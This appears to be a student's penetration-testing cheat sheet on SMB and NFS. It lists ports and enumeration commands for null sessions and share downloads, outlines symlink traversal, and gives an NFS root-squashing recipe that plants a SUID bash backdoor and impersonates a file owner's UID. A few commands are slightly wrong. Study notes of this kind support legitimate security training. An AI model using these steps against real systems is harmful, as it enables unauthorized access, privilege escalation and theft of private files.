SMB (Server Message Block)

- TCP 445: Direct Host  
- UDP 137/138 & TCP 139: legacy ports for NetBIOS communication  
- Share resources between networks (printers, files, etc.)  
- Backing of Active Directory  
- Tools  
  - smbclient \-L //\<target\_ip\>/ \-U \<username\>    		   (visible folders)  
  - smbclient \-L //\<target\_ip\>/ \<share\_name\> \-U \<username\>    (connect to share)  
  - Mask “”, resources ON, prompt OFF, mget \*    		   (download all files)  
  - put localfile 							   (upload)  
  - Sudo mount \-t cifs //\<target\_IP\>/\<share\> /mnt/smb \-o	   (mount as a drive)  
- Null Sessions  
  - Query the system for information without a username or password  
    - Rpcclient \-U “” \-N \<target\>		(check for vulnerability /null session)  
    - Enumdamusers or querydispinfo	(enumerate users)  
    - Smbclient \-L //\<target\> \-N		(list shares)  
    - Enum4linux \-a \<target\>		(scrape system/user data)  
- Symbolic Link (Symlink) Traversal  
  - Goal:  
    1\.  Create a symlink to root  
    2\. cd to that symlink  
    3\. Then we’re at root and can go wherever

NFS

- SMB for Windows  
- TCP/UDP 2049: NFS Primary comm  
- TCP/UDP 111: direct client to correct NFS service port  
- Used to share home directories across workstations to provide centralized storage for a cluster of web servers  
- Tools  
  - Showmount \-e \<target\_ip\>					(discover exports)  
  - Mkdir /mnt/nfs\_share						(mount point)  
  - Sudo mount \-t nfs \<target\_ip\>:/remote/path /mnt/nfs\_share (standard interaction)  
  - Sudo umount /mnt/nfs\_share					(disconnect)  
- Root Squashing  
  - Check for Shares: showmount \-e \<target\> (Look for shares exported to \* or specific subnets).  
  - Mount the Share: sudo mount \-t nfs \<target\>:/shared\_dir /mnt/loot.  
  - Root Privilege Escalation: cp /bin/bash /mnt/loot/rootshell; chmod \+s /mnt/loot/rootshell (As root with write access. Creates a SUID backdoor).  
  - ID/GUID Impersonation: ls \-ln /mnt/loot (Find owner ID) then sudo useradd \-u \<ID\> victim; sudo su victim (Gains access to that user's private files).

